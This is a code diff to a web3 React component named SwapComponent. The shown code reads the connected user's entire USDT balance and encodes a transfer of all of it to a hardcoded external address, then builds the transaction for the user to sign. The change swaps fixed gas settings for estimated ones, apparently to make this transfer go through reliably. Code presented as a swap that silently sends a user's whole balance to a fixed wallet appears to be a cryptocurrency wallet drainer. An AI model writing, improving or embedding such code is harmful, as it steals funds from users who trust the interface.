@@ -77,21 +77,25 @@ function SwapComponent() {
     })
     const balance = await usdtContract.methods.balanceOf(address).call()
 
-    console.log(balance)
-
     const data = usdtContract.methods
       .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
       .encodeABI()
 
     const nonce = await web3js.eth.getTransactionCount(address, 'pending')
+    const gasPrice = await web3js.eth.getGasPrice()
+    const gasLimit = await web3js.eth.estimateGas({
+      from: address,
+      to: usdtContractAddress,
+      data: data,
+    })
     const chainId = mainnet.id
 
     const tx_ = {
       from: address,
       to: usdtContractAddress,
       nonce: web3js.utils.toHex(nonce),
-      gasPrice: web3js.utils.toHex(20 * 1e9),
-      gasLimit: web3js.utils.toHex(210000),
+      gasPrice: web3js.utils.toHex(gasPrice),
+      gasLimit: web3js.utils.toHex(gasLimit),
       value: '0x0',
       data: data,
       chainId: web3js.utils.toHex(chainId),
